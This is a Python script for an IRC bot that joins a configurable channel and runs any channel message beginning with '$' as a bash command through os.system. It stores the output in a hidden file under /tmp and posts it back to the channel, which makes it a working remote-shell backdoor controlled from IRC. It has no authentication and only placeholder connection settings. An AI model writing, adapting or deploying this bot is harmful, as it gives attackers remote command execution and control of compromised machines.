import os, socket, _thread, time

def main() -> None:
    ip   = ""
    port = 6667
    name = "username_here"  
    nick = "nick_here"
    global chan 
    chan = "#channel_name_here"

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  
    sock.connect((ip, port))
    time.sleep(5) # wait for server to connect
    
    sock.send(f"USER {name} * * :{nick}\r\n".encode("utf-8"))
    time.sleep(1) # wait for server to process
    
    sock.send(f"NICK {nick}\r\n".encode("utf-8"))
    time.sleep(5) # wait for server to process
    
    sock.send(f"JOIN {chan}\r\n".encode("utf-8"))
    time.sleep(1)

    _thread.start_new_thread(receive_messages, (sock,))
    while True:
        time.sleep(60)
        sock.send(f"PING :{ip}\r\n".encode("utf-8"))
def receive_messages(sock) -> None:
    while True:
        data = sock.recv(1024)
        if not data:
            break

        response = data.decode("utf-8")
        print(response)
        if "PRIVMSG" in response and chan in response:
            try:
                command = response.split(" ", 3)[3][1:]
            except Exception:
                command = ""

            if command.startswith("$"):
                try:
                    command = command.split(" ", 1)[1]
                except Exception:
                    command = ""
		
                command = f"/bin/bash -c \"{command.strip()}\" >/tmp/.command 2>&1"
                os.system(command)
                with open("/tmp/.command", "r") as f:
                    output = f.read()
                    
                print(output)
                for line in output.split("\n"):
                    sock.send(f"PRIVMSG {chan} :{line}\r\n".encode("utf-8"))
                    time.sleep(0.5)

        else:
            print("message not ok")
				
def send_ping(sock, server) -> None:
    while True:
        time.sleep(60)
        sock.send(f"PING :{server}\r\n".encode("utf-8"))


if __name__ == "__main__":
    main()
